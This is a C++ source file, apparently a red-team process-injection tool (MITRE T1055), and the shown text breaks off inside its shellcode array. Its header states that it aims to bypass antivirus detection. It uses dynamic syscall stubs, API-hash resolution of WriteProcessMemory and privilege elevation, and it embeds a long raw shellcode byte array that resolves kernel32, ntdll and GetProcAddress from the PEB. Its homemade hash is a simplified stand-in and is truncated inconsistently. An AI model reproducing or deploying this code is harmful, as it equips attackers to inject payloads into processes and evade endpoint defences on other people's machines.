/**
Author: Thomas X Meng
T1055 Process Injection
Sifu syscall Process Injection code. 
**/
/***
 * To break both the heuristic and behavioural detection of AVs, we can use the following techniques:
 * To load the VirtualAlloc and CreateRemoteThread and CloseHandle functions using dynamic syscall stubs
 * but load the WriteProcessMemory using API hashing, thus bypassing the heuristic detection of AVs that detecting 
 * both techniques (dynamic syscall stubs and API hashing) at the same time. To satisfy the conventional PE injection rules,
 *  The three stages of PE injection need to be observed in sequence.  
 * Sub-techniques: Devide and conquer, reference: 
 * https://gist.github.com/theevilbit/073ca4eb15383eb3254272fc24632efd
*/
#include <iostream>
#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#include <cstring>
#pragma comment(lib, "ntdll")
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif



typedef DWORD(WINAPI *PFN_GETLASTERROR)();
typedef void (WINAPI *PFN_GETNATIVESYSTEMINFO)(LPSYSTEM_INFO lpSystemInfo);
const int SYSCALL_STUB_SIZE = 23; // How arch depend are syscall stubs? 

// Define function pointers for the dynamic syscalls
using myNtOpenProcess = NTSTATUS(NTAPI*)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientID);
using myNtAllocateVirtualMemory = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
using myNtCreateThreadEx = NTSTATUS(NTAPI*)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList);
using myNtClose = NTSTATUS(NTAPI*)(HANDLE Handle);

// Define prototype for the API hashing function
using customWriteProcessMemory = BOOL(WINAPI*)(
    HANDLE  hProcess,
    LPVOID  lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T  nSize,
    SIZE_T  *lpNumberOfBytesWritten
);


PVOID RVAtoRawOffset(DWORD_PTR RVA, PIMAGE_SECTION_HEADER section)
{
	return (PVOID)(RVA - section->VirtualAddress + section->PointerToRawData);
}

BOOL GetSyscallStub(LPCSTR functionName, PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection, LPVOID syscallStub)
{
	PDWORD addressOfNames = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&exportDirectory->AddressOfNames), rdataSection);
	PDWORD addressOfFunctions = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&exportDirectory->AddressOfFunctions), rdataSection);
	BOOL stubFound = FALSE; 

	for (size_t i = 0; i < exportDirectory->NumberOfNames; i++)
	{
		DWORD_PTR functionNameVA = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + addressOfNames[i], rdataSection);
		DWORD_PTR functionVA = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + addressOfFunctions[i + 1], textSection);
		LPCSTR functionNameResolved = (LPCSTR)functionNameVA;
		if (strcmp(functionNameResolved, functionName) == 0)
		{
            printf("[+] Address of %s in manual loaded ntdll export table: %p\n", functionName, (void*)functionVA);
			memcpy(syscallStub, (LPVOID)functionVA, SYSCALL_STUB_SIZE);
			stubFound = TRUE;
			printf("[+] Syscall stub for %s found.\n", functionName);
            // Print the syscall stub bytes
            printf("[+] Syscall stub bytes: ");
            for (int i = 0; i < SYSCALL_STUB_SIZE; i++) {
                printf("%02X ", ((unsigned char*)syscallStub)[i]);
            }
            printf("\n");
			break;
		}
	}

	if (!stubFound) {
		printf("[-] Syscall stub for %s not found.\n", functionName);
	}
	return stubFound;
}


BOOL EnableWindowsPrivilege(const wchar_t* Privilege) {
    HANDLE token;
    TOKEN_PRIVILEGES priv;
    BOOL ret = FALSE;
    wprintf(L" [+] Enable %ls adequate privilege\n", Privilege);

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) {
        priv.PrivilegeCount = 1;
        priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        // if (LookupPrivilegeValue(NULL, Privilege, &priv.Privileges[0].Luid) != FALSE &&
        if (LookupPrivilegeValueW(NULL, Privilege, &priv.Privileges[0].Luid) != FALSE &&
            AdjustTokenPrivileges(token, FALSE, &priv, 0, NULL, NULL) != FALSE) {
            ret = TRUE;
        }

        if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) { // In case privilege is not part of token (e.g. run as non-admin)
            ret = FALSE;
        }

        CloseHandle(token);
    }

    if (ret == TRUE)
        wprintf(L" [+] Success\n");
    else
        wprintf(L" [-] Failure\n");

    return ret;
}

BOOL IsSystem64Bit() {
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    if (!hKernel32) return FALSE;

    PFN_GETNATIVESYSTEMINFO pGetNativeSystemInfo = (PFN_GETNATIVESYSTEMINFO)GetProcAddress(hKernel32, "GetNativeSystemInfo");
    if (!pGetNativeSystemInfo) {
        FreeLibrary(hKernel32);
        return FALSE;
    }

    BOOL bIsWow64 = FALSE;
    SYSTEM_INFO si = {0};
    pGetNativeSystemInfo(&si);
    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 || si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64) {
        bIsWow64 = TRUE;
    }

    FreeLibrary(hKernel32);
    return bIsWow64;
}

class CityHash {
public:
    uint64_t CityHash64(const char *buf, size_t len) {
        if (len <= 32) {
            if (len <= 16) {
                return HashLen0to16(buf, len);
            } else {
                return HashLen17to32(buf, len);
            }
        } else if (len <= 64) {
            return HashLen33to64(buf, len);
        }

        // For strings over 64 characters, CityHash uses a more complex algorithm
        // which is too lengthy to implement here. The official CityHash
        // implementation should be used for such cases.

        // Simplified version for longer strings:
        uint64_t hash = 0;
        for (size_t i = 0; i < len; ++i) {
            hash = hash * 33 + buf[i];
        }
        return hash;
    }

private:
    uint64_t HashLen0to16(const char* s, size_t len) {
        // Simplified hashing for short strings
        uint64_t a = 0, b = 0;
        for (size_t i = 0; i < len; ++i) {
            a = a * 31 + s[i];
            b = b * 33 + s[i];
        }
        return (a << 1) ^ b;
    }

    uint64_t HashLen17to32(const char* s, size_t len) {
        // Simplified hashing for medium strings
        uint64_t a = 0, b = 0;
        for (size_t i = 0; i < len; ++i) {
            a = a * 31 + s[i];
            b = b * 29 + s[i];
        }
        return (a << 2) ^ b;
    }

    uint64_t HashLen33to64(const char* s, size_t len) {
        // Simplified hashing for larger strings
        uint64_t a = 0, b = 0;
        for (size_t i = 0; i < len; ++i) {
            a = a * 37 + s[i];
            b = b * 39 + s[i];
        }
        return (a << 3) ^ b;
    }
};

CityHash cityHasher;

uint64_t getHashFromString(const char *string) {
    size_t stringLength = strnlen_s(string, 50);
    // Using CityHash to compute the hash
    return cityHasher.CityHash64(string, stringLength);
}

// class SimpleMurmurHash3 {
// public:
//     uint32_t computeHash32(const char* data, size_t len, uint32_t seed = 0) {
//         uint32_t hash = seed;
//         const uint32_t c1 = 0xcc9e2d51;
//         const uint32_t c2 = 0x1b873593;

//         const int nblocks = len / 4;
//         const uint32_t* blocks = (const uint32_t*)(data);
//         for (int i = 0; i < nblocks; i++) {
//             uint32_t k = blocks[i];
//             k *= c1;
//             k = rotl32(k, 15);
//             k *= c2;
            
//             hash ^= k;
//             hash = rotl32(hash, 13); 
//             hash = hash * 5 + 0xe6546b64;
//         }

//         const uint8_t* tail = (const uint8_t*)(data + nblocks * 4);
//         uint32_t k1 = 0;
//         switch (len & 3) {
//             case 3: k1 ^= tail[2] << 16;
//             case 2: k1 ^= tail[1] << 8;
//             case 1: k1 ^= tail[0];
//                     k1 *= c1; k1 = rotl32(k1, 15); k1 *= c2; hash ^= k1;
//         };

//         hash ^= len;
//         hash = fmix32(hash);

//         return hash;
//     }

// private:
//     static uint32_t rotl32(uint32_t x, int8_t r) {
//         return (x << r) | (x >> (32 - r));
//     }

//     static uint32_t fmix32(uint32_t h) {
//         h ^= h >> 16;
//         h *= 0x85ebca6b;
//         h ^= h >> 13;
//         h *= 0xc2b2ae35;
//         h ^= h >> 16;
//         return h;
//     }
// };


// SimpleMurmurHash3 hasher;
// DWORD getHashFromString(const char *string) {
//     size_t stringLength = strnlen_s(string, 50);
//     return hasher.computeHash32(string, stringLength);
// }

// DWORD getHashFromString(char *string)
// {
//     size_t stringLength = strnlen_s(string, 50);
//     DWORD hash = 0x35;

//     for (size_t i = 0; i < stringLength; i++)
//     {
//         hash += (hash * 0xab10f29f + string[i]) & 0xffffff;
//     }
//     // printf("%s: 0x00%x\n", string, hash);

//     return hash;
// }

// FNV-1a hash: This implementation uses a variant of the FNV-1a hash algorithm, 
//which is known for its simplicity and relatively good distribution properties. 
//The constants 0x811c9dc5 and 0x1000193 are parameters of the FNV-1a algorithm.

//This hash function is straightforward, yet it should provide a better balance between simplicity and effectiveness

//32-bit FNV-1a hash
// Improve the distribution and collision resistance of the hash values
// class ImprovedHash {
// public:
//     uint32_t computeHash(const char* input, size_t length) {
//         uint32_t hash = 0x811c9dc5;
//         uint32_t prime = 0x1000193;

//         for (size_t i = 0; i < length; ++i) {
//             uint8_t value = input[i];
//             hash ^= value;
//             hash *= prime;
//         }

//         // Finalization step to improve distribution
//         hash ^= hash >> 16;
//         hash *= 0x85ebca6b;
//         hash ^= hash >> 13;
//         hash *= 0xc2b2ae35;
//         hash ^= hash >> 16;

//         return hash;
//     }
// };

//64-bit FNV-1a hash
// class ImprovedHash {
// public:
//     uint64_t computeHash(const char* input, size_t length) {
//         uint64_t hash = 0xcbf29ce484222325; // 64-bit initial value, FNV_offset_basis
//         uint64_t prime = 0x100000001b3;     // 64-bit prime, FNV_prime value

//         for (size_t i = 0; i < length; ++i) {
//             uint8_t value = input[i];
//             hash ^= value;
//             hash *= prime;
//         }

//         // Finalization steps
//         hash ^= hash >> 33;
//         hash *= 0xff51afd7ed558ccd;
//         hash ^= hash >> 33;
//         hash *= 0xc4ceb9fe1a85ec53;
//         hash ^= hash >> 33;

//         return hash;
//     }
// };

// // Replace the original getHashFromString with this new implementation
// ImprovedHash hasher;
// // DWORD getHashFromString(char *string) {
// DWORD getHashFromString(const char *string) {
//     size_t stringLength = strnlen_s(string, 50);
//     return hasher.computeHash(string, stringLength);
// }

PDWORD getFunctionAddressByHash(char *library, DWORD hash)
{
	PDWORD functionAddress = (PDWORD)0;

	// Get base address of the module in which our exported function of interest resides (kernel32 in the case of CreateThread)
	HMODULE libraryBase = LoadLibraryA(library);

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)libraryBase;
	PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)libraryBase + dosHeader->e_lfanew);
	
	DWORD_PTR exportDirectoryRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	
	PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)libraryBase + exportDirectoryRVA);
	
	// Get RVAs to exported function related information
	PDWORD addresOfFunctionsRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfFunctions);
	PDWORD addressOfNamesRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNames);
	PWORD addressOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNameOrdinals);

	// Iterate through exported functions, calculate their hashes and check if any of them match our hash of 0x00544e304 (CreateThread)
	// If yes, get its virtual memory address (this is where CreateThread function resides in memory of our process)
	for (DWORD i = 0; i < imageExportDirectory->NumberOfFunctions; i++)
	{
		DWORD functionNameRVA = addressOfNamesRVA[i];
		DWORD_PTR functionNameVA = (DWORD_PTR)libraryBase + functionNameRVA;
		char* functionName = (char*)functionNameVA;
		DWORD_PTR functionAddressRVA = 0;

		// Calculate hash for this exported function
		DWORD functionNameHash = getHashFromString(functionName);
		
		// If hash for API function is found, resolve the function address
		if (functionNameHash == hash)
		{
			functionAddressRVA = addresOfFunctionsRVA[addressOfNameOrdinalsRVA[i]];
			functionAddress = (PDWORD)((DWORD_PTR)libraryBase + functionAddressRVA);
			printf("[*] function name:%s hash: 0x%x RVA: %p\n", functionName, functionNameHash, functionAddress);
			return functionAddress;
		}
	}
}

unsigned char magiccode[] =
{
0x40,0x55,0x57,0x48,0x81,0xec,0x78,0x05,0x00,0x00,
0x48,0x8d,0x6c,0x24,0x60,0x65,0x48,0x8b,0x04,0x25,
0x60,0x00,0x00,0x00,0x48,0x89,0x45,0x00,0x48,0x8b,
0x45,0x00,0x48,0x8b,0x40,0x18,0x48,0x89,0x45,0x08,
0x48,0x8b,0x45,0x08,0xc6,0x40,0x48,0x00,0x48,0x8b,
0x45,0x00,0x48,0x8b,0x40,0x18,0x48,0x83,0xc0,0x20,
0x48,0x89,0x85,0xb0,0x02,0x00,0x00,0x48,0x8b,0x85,
0xb0,0x02,0x00,0x00,0x48,0x8b,0x00,0x48,0x89,0x85,
0xb8,0x02,0x00,0x00,0x48,0xb8,0x6b,0x00,0x65,0x00,
0x72,0x00,0x6e,0x00,0x48,0x89,0x45,0x38,0x48,0xb8,
0x65,0x00,0x6c,0x00,0x33,0x00,0x32,0x00,0x48,0x89,
0x45,0x40,0x48,0xb8,0x2e,0x00,0x64,0x00,0x6c,0x00,
0x6c,0x00,0x48,0x89,0x45,0x48,0x48,0xc7,0x45,0x50,
0x00,0x00,0x00,0x00,0x48,0xc7,0x85,0xd0,0x02,0x00,
0x00,0x00,0x00,0x00,0x00,0x48,0x8b,0x85,0xb0,0x02,
0x00,0x00,0x48,0x8b,0x00,0x48,0x89,0x85,0xb8,0x02,
0x00,0x00,0x48,0x8b,0x85,0xb8,0x02,0x00,0x00,0x48,
0x83,0xe8,0x10,0x48,0x89,0x85,0xd8,0x02,0x00,0x00,
0xc7,0x85,0xe0,0x02,0x00,0x00,0x00,0x00,0x00,0x00,
0x48,0x8b,0x85,0xd8,0x02,0x00,0x00,0x48,0x8b,0x40,
0x60,0x48,0x89,0x85,0xc8,0x02,0x00,0x00,0x48,0x8d,
0x45,0x38,0x48,0x89,0x85,0xc0,0x02,0x00,0x00,0xc7,
0x85,0xe0,0x02,0x00,0x00,0x01,0x00,0x00,0x00,0x48,
0x8b,0x85,0xc8,0x02,0x00,0x00,0x0f,0xb7,0x00,0x85,
0xc0,0x75,0x0f,0xc7,0x85,0xe0,0x02,0x00,0x00,0x00,
0x00,0x00,0x00,0xe9,0x2e,0x01,0x00,0x00,0x48,0x8b,
0x85,0xc8,0x02,0x00,0x00,0x0f,0xb6,0x00,0x88,0x85,
0xe4,0x02,0x00,0x00,0x48,0x8b,0x85,0xc8,0x02,0x00,
0x00,0x0f,0xb7,0x00,0x3d,0xff,0x00,0x00,0x00,0x7e,
0x13,0x48,0x8b,0x85,0xc8,0x02,0x00,0x00,0x0f,0xb7,
0x00,0x66,0x89,0x85,0xe8,0x02,0x00,0x00,0xeb,0x46,
0x0f,0xbe,0x85,0xe4,0x02,0x00,0x00,0x83,0xf8,0x41,
0x7c,0x1e,0x0f,0xbe,0x85,0xe4,0x02,0x00,0x00,0x83,
0xf8,0x5a,0x7f,0x12,0x0f,0xbe,0x85,0xe4,0x02,0x00,
0x00,0x83,0xc0,0x20,0x88,0x85,0xe5,0x02,0x00,0x00,
0xeb,0x0d,0x0f,0xb6,0x85,0xe4,0x02,0x00,0x00,0x88,
0x85,0xe5,0x02,0x00,0x00,0x66,0x0f,0xbe,0x85,0xe5,
0x02,0x00,0x00,0x66,0x89,0x85,0xe8,0x02,0x00,0x00,
0x48,0x8b,0x85,0xc0,0x02,0x00,0x00,0x0f,0xb6,0x00,
0x88,0x85,0xe4,0x02,0x00,0x00,0x48,0x8b,0x85,0xc0,
0x02,0x00,0x00,0x0f,0xb7,0x00,0x3d,0xff,0x00,0x00,
0x00,0x7e,0x13,0x48,0x8b,0x85,0xc0,0x02,0x00,0x00,
0x0f,0xb7,0x00,0x66,0x89,0x85,0xec,0x02,0x00,0x00,
0xeb,0x46,0x0f,0xbe,0x85,0xe4,0x02,0x00,0x00,0x83,
0xf8,0x41,0x7c,0x1e,0x0f,0xbe,0x85,0xe4,0x02,0x00,
0x00,0x83,0xf8,0x5a,0x7f,0x12,0x0f,0xbe,0x85,0xe4,
0x02,0x00,0x00,0x83,0xc0,0x20,0x88,0x85,0xe5,0x02,
0x00,0x00,0xeb,0x0d,0x0f,0xb6,0x85,0xe4,0x02,0x00,
0x00,0x88,0x85,0xe5,0x02,0x00,0x00,0x66,0x0f,0xbe,
0x85,0xe5,0x02,0x00,0x00,0x66,0x89,0x85,0xec,0x02,
0x00,0x00,0x48,0x8b,0x85,0xc8,0x02,0x00,0x00,0x48,
0x83,0xc0,0x02,0x48,0x89,0x85,0xc8,0x02,0x00,0x00,
0x48,0x8b,0x85,0xc0,0x02,0x00,0x00,0x48,0x83,0xc0,
0x02,0x48,0x89,0x85,0xc0,0x02,0x00,0x00,0x0f,0xb7,
0x85,0xe8,0x02,0x00,0x00,0x0f,0xb7,0x8d,0xec,0x02,
0x00,0x00,0x3b,0xc1,0x0f,0x84,0xb5,0xfe,0xff,0xff,
0x83,0xbd,0xe0,0x02,0x00,0x00,0x00,0x0f,0x84,0x2e,
0x01,0x00,0x00,0x48,0x8b,0x85,0xc8,0x02,0x00,0x00,
0x48,0x83,0xe8,0x02,0x48,0x89,0x85,0xc8,0x02,0x00,
0x00,0x48,0x8b,0x85,0xc0,0x02,0x00,0x00,0x48,0x83,
0xe8,0x02,0x48,0x89,0x85,0xc0,0x02,0x00,0x00,0x48,
0x8b,0x85,0xc8,0x02,0x00,0x00,0x0f,0xb6,0x00,0x88,
0x85,0xe4,0x02,0x00,0x00,0x48,0x8b,0x85,0xc8,0x02,
0x00,0x00,0x0f,0xb7,0x00,0x3d,0xff,0x00,0x00,0x00,
0x7e,0x13,0x48,0x8b,0x85,0xc8,0x02,0x00,0x00,0x0f,
0xb7,0x00,0x66,0x89,0x85,0xe8,0x02,0x00,0x00,0xeb,
0x46,0x0f,0xbe,0x85,0xe4,0x02,0x00,0x00,0x83,0xf8,
0x41,0x7c,0x1e,0x0f,0xbe,0x85,0xe4,0x02,0x00,0x00,
0x83,0xf8,0x5a,0x7f,0x12,0x0f,0xbe,0x85,0xe4,0x02,
0x00,0x00,0x83,0xc0,0x20,0x88,0x85,0xe5,0x02,0x00,
0x00,0xeb,0x0d,0x0f,0xb6,0x85,0xe4,0x02,0x00,0x00,
0x88,0x85,0xe5,0x02,0x00,0x00,0x66,0x0f,0xbe,0x85,
0xe5,0x02,0x00,0x00,0x66,0x89,0x85,0xe8,0x02,0x00,
0x00,0x48,0x8b,0x85,0xc0,0x02,0x00,0x00,0x0f,0xb6,
0x00,0x88,0x85,0xe4,0x02,0x00,0x00,0x48,0x8b,0x85,
0xc0,0x02,0x00,0x00,0x0f,0xb7,0x00,0x3d,0xff,0x00,
0x00,0x00,0x7e,0x13,0x48,0x8b,0x85,0xc0,0x02,0x00,
0x00,0x0f,0xb7,0x00,0x66,0x89,0x85,0xec,0x02,0x00,
0x00,0xeb,0x46,0x0f,0xbe,0x85,0xe4,0x02,0x00,0x00,
0x83,0xf8,0x41,0x7c,0x1e,0x0f,0xbe,0x85,0xe4,0x02,
0x00,0x00,0x83,0xf8,0x5a,0x7f,0x12,0x0f,0xbe,0x85,
0xe4,0x02,0x00,0x00,0x83,0xc0,0x20,0x88,0x85,0xe5,
0x02,0x00,0x00,0xeb,0x0d,0x0f,0xb6,0x85,0xe4,0x02,
0x00,0x00,0x88,0x85,0xe5,0x02,0x00,0x00,0x66,0x0f,
0xbe,0x85,0xe5,0x02,0x00,0x00,0x66,0x89,0x85,0xec,
0x02,0x00,0x00,0x0f,0xb7,0x85,0xe8,0x02,0x00,0x00,
0x0f,0xb7,0x8d,0xec,0x02,0x00,0x00,0x2b,0xc1,0x89,
0x85,0xe0,0x02,0x00,0x00,0x83,0xbd,0xe0,0x02,0x00,
0x00,0x00,0x75,0x10,0x48,0x8b,0x85,0xd8,0x02,0x00,
0x00,0x48,0x89,0x85,0xd0,0x02,0x00,0x00,0xeb,0x25,
0x48,0x8b,0x85,0xb8,0x02,0x00,0x00,0x48,0x8b,0x00,
0x48,0x89,0x85,0xb8,0x02,0x00,0x00,0x48,0x8b,0x85,
0xb0,0x02,0x00,0x00,0x48,0x39,0x85,0xb8,0x02,0x00,
0x00,0x0f,0x85,0xf9,0xfc,0xff,0xff,0x48,0x8b,0x85,
0xd0,0x02,0x00,0x00,0x48,0x89,0x85,0xf0,0x02,0x00,
0x00,0x48,0xb8,0x6e,0x00,0x74,0x00,0x64,0x00,0x6c,
0x00,0x48,0x89,0x45,0x38,0x48,0xb8,0x6c,0x00,0x2e,
0x00,0x64,0x00,0x6c,0x00,0x48,0x89,0x45,0x40,0x48,
0xc7,0x45,0x48,0x6c,0x00,0x00,0x00,0x48,0xc7,0x45,
0x50,0x00,0x00,0x00,0x00,0x48,0xc7,0x85,0xf8,0x02,
0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8b,0x85,0xb0,
0x02,0x00,0x00,0x48,0x8b,0x00,0x48,0x89,0x85,0xb8,
0x02,0x00,0x00,0x48,0x8b,0x85,0xb8,0x02,0x00,0x00,
0x48,0x83,0xe8,0x10,0x48,0x89,0x85,0x00,0x03,0x00,
0x00,0xc7,0x85,0x08,0x03,0x00,0x00,0x00,0x00,0x00,
0x00,0x48,0x8b,0x85,0x00,0x03,0x00,0x00,0x48,0x8b,
0x40,0x60,0x48,0x89,0x85,0xc8,0x02,0x00,0x00,0x48,
0x8d,0x45,0x38,0x48,0x89,0x85,0xc0,0x02,0x00,0x00,
0xc7,0x85,0x08,0x03,0x00,0x00,0x01,0x00,0x00,0x00,
0x48,0x8b,0x85,0xc8,0x02,0x00,0x00,0x0f,0xb7,0x00,
0x85,0xc0,0x75,0x0f,0xc7,0x85,0x08,0x03,0x00,0x00,
0x00,0x00,0x00,0x00,0xe9,0x2e,0x01,0x00,0x00,0x48,
0x8b,0x85,0xc8,0x02,0x00,0x00,0x0f,0xb6,0x00,0x88,
0x85,0x0c,0x03,0x00,0x00,0x48,0x8b,0x85,0xc8,0x02,
0x00,0x00,0x0f,0xb7,0x00,0x3d,0xff,0x00,0x00,0x00,
0x7e,0x13,0x48,0x8b,0x85,0xc8,0x02,0x00,0x00,0x0f,
0xb7,0x00,0x66,0x89,0x85,0x10,0x03,0x00,0x00,0xeb,
0x46,0x0f,0xbe,0x85,0x0c,0x03,0x00,0x00,0x83,0xf8,
0x41,0x7c,0x1e,0x0f,0xbe,0x85,0x0c,0x03,0x00,0x00,
0x83,0xf8,0x5a,0x7f,0x12,0x0f,0xbe,0x85,0x0c,0x03,
0x00,0x00,0x83,0xc0,0x20,0x88,0x85,0x0d,0x03,0x00,
0x00,0xeb,0x0d,0x0f,0xb6,0x85,0x0c,0x03,0x00,0x00,
0x88,0x85,0x0d,0x03,0x00,0x00,0x66,0x0f,0xbe,0x85,
0x0d,0x03,0x00,0x00,0x66,0x89,0x85,0x10,0x03,0x00,
0x00,0x48,0x8b,0x85,0xc0,0x02,0x00,0x00,0x0f,0xb6,
0x00,0x88,0x85,0x0c,0x03,0x00,0x00,0x48,0x8b,0x85,
0xc0,0x02,0x00,0x00,0x0f,0xb7,0x00,0x3d,0xff,0x00,
0x00,0x00,0x7e,0x13,0x48,0x8b,0x85,0xc0,0x02,0x00,
0x00,0x0f,0xb7,0x00,0x66,0x89,0x85,0x14,0x03,0x00,
0x00,0xeb,0x46,0x0f,0xbe,0x85,0x0c,0x03,0x00,0x00,
0x83,0xf8,0x41,0x7c,0x1e,0x0f,0xbe,0x85,0x0c,0x03,
0x00,0x00,0x83,0xf8,0x5a,0x7f,0x12,0x0f,0xbe,0x85,
0x0c,0x03,0x00,0x00,0x83,0xc0,0x20,0x88,0x85,0x0d,
0x03,0x00,0x00,0xeb,0x0d,0x0f,0xb6,0x85,0x0c,0x03,
0x00,0x00,0x88,0x85,0x0d,0x03,0x00,0x00,0x66,0x0f,
0xbe,0x85,0x0d,0x03,0x00,0x00,0x66,0x89,0x85,0x14,
0x03,0x00,0x00,0x48,0x8b,0x85,0xc8,0x02,0x00,0x00,
0x48,0x83,0xc0,0x02,0x48,0x89,0x85,0xc8,0x02,0x00,
0x00,0x48,0x8b,0x85,0xc0,0x02,0x00,0x00,0x48,0x83,
0xc0,0x02,0x48,0x89,0x85,0xc0,0x02,0x00,0x00,0x0f,
0xb7,0x85,0x10,0x03,0x00,0x00,0x0f,0xb7,0x8d,0x14,
0x03,0x00,0x00,0x3b,0xc1,0x0f,0x84,0xb5,0xfe,0xff,
0xff,0x83,0xbd,0x08,0x03,0x00,0x00,0x00,0x0f,0x84,
0x2e,0x01,0x00,0x00,0x48,0x8b,0x85,0xc8,0x02,0x00,
0x00,0x48,0x83,0xe8,0x02,0x48,0x89,0x85,0xc8,0x02,
0x00,0x00,0x48,0x8b,0x85,0xc0,0x02,0x00,0x00,0x48,
0x83,0xe8,0x02,0x48,0x89,0x85,0xc0,0x02,0x00,0x00,
0x48,0x8b,0x85,0xc8,0x02,0x00,0x00,0x0f,0xb6,0x00,
0x88,0x85,0x0c,0x03,0x00,0x00,0x48,0x8b,0x85,0xc8,
0x02,0x00,0x00,0x0f,0xb7,0x00,0x3d,0xff,0x00,0x00,
0x00,0x7e,0x13,0x48,0x8b,0x85,0xc8,0x02,0x00,0x00,
0x0f,0xb7,0x00,0x66,0x89,0x85,0x10,0x03,0x00,0x00,
0xeb,0x46,0x0f,0xbe,0x85,0x0c,0x03,0x00,0x00,0x83,
0xf8,0x41,0x7c,0x1e,0x0f,0xbe,0x85,0x0c,0x03,0x00,
0x00,0x83,0xf8,0x5a,0x7f,0x12,0x0f,0xbe,0x85,0x0c,
0x03,0x00,0x00,0x83,0xc0,0x20,0x88,0x85,0x0d,0x03,
0x00,0x00,0xeb,0x0d,0x0f,0xb6,0x85,0x0c,0x03,0x00,
0x00,0x88,0x85,0x0d,0x03,0x00,0x00,0x66,0x0f,0xbe,
0x85,0x0d,0x03,0x00,0x00,0x66,0x89,0x85,0x10,0x03,
0x00,0x00,0x48,0x8b,0x85,0xc0,0x02,0x00,0x00,0x0f,
0xb6,0x00,0x88,0x85,0x0c,0x03,0x00,0x00,0x48,0x8b,
0x85,0xc0,0x02,0x00,0x00,0x0f,0xb7,0x00,0x3d,0xff,
0x00,0x00,0x00,0x7e,0x13,0x48,0x8b,0x85,0xc0,0x02,
0x00,0x00,0x0f,0xb7,0x00,0x66,0x89,0x85,0x14,0x03,
0x00,0x00,0xeb,0x46,0x0f,0xbe,0x85,0x0c,0x03,0x00,
0x00,0x83,0xf8,0x41,0x7c,0x1e,0x0f,0xbe,0x85,0x0c,
0x03,0x00,0x00,0x83,0xf8,0x5a,0x7f,0x12,0x0f,0xbe,
0x85,0x0c,0x03,0x00,0x00,0x83,0xc0,0x20,0x88,0x85,
0x0d,0x03,0x00,0x00,0xeb,0x0d,0x0f,0xb6,0x85,0x0c,
0x03,0x00,0x00,0x88,0x85,0x0d,0x03,0x00,0x00,0x66,
0x0f,0xbe,0x85,0x0d,0x03,0x00,0x00,0x66,0x89,0x85,
0x14,0x03,0x00,0x00,0x0f,0xb7,0x85,0x10,0x03,0x00,
0x00,0x0f,0xb7,0x8d,0x14,0x03,0x00,0x00,0x2b,0xc1,
0x89,0x85,0x08,0x03,0x00,0x00,0x83,0xbd,0x08,0x03,
0x00,0x00,0x00,0x75,0x10,0x48,0x8b,0x85,0x00,0x03,
0x00,0x00,0x48,0x89,0x85,0xf8,0x02,0x00,0x00,0xeb,
0x25,0x48,0x8b,0x85,0xb8,0x02,0x00,0x00,0x48,0x8b,
0x00,0x48,0x89,0x85,0xb8,0x02,0x00,0x00,0x48,0x8b,
0x85,0xb0,0x02,0x00,0x00,0x48,0x39,0x85,0xb8,0x02,
0x00,0x00,0x0f,0x85,0xf9,0xfc,0xff,0xff,0x48,0x8b,
0x85,0xd0,0x02,0x00,0x00,0x48,0x8b,0x40,0x30,0x48,
0x89,0x85,0x18,0x03,0x00,0x00,0x48,0x8b,0x85,0x18,
0x03,0x00,0x00,0x48,0x63,0x40,0x3c,0x48,0x8b,0x8d,
0x18,0x03,0x00,0x00,0x48,0x03,0xc8,0x48,0x8b,0xc1,
0x48,0x89,0x85,0x20,0x03,0x00,0x00,0xb8,0x08,0x00,
0x00,0x00,0x48,0x6b,0xc0,0x00,0x48,0x8b,0x8d,0x20,
0x03,0x00,0x00,0x8b,0x84,0x01,0x88,0x00,0x00,0x00,
0x48,0x8b,0x8d,0x18,0x03,0x00,0x00,0x48,0x03,0xc8,
0x48,0x8b,0xc1,0x48,0x89,0x85,0x28,0x03,0x00,0x00,
0x48,0x8b,0x85,0x28,0x03,0x00,0x00,0x8b,0x40,0x20,
0x48,0x8b,0x8d,0x18,0x03,0x00,0x00,0x48,0x03,0xc8,
0x48,0x8b,0xc1,0x48,0x89,0x85,0x30,0x03,0x00,0x00,
0x48,0xb8,0x47,0x65,0x74,0x50,0x72,0x6f,0x63,0x41,
0x48,0x89,0x45,0x10,0xc7,0x85,0x38,0x03,0x00,0x00,
0x00,0x00,0x00,0x00,0x48,0x63,0x85,0x38,0x03,0x00,
0x00,0x48,0x8b,0x8d,0x30,0x03,0x00,0x00,0x48,0x63,
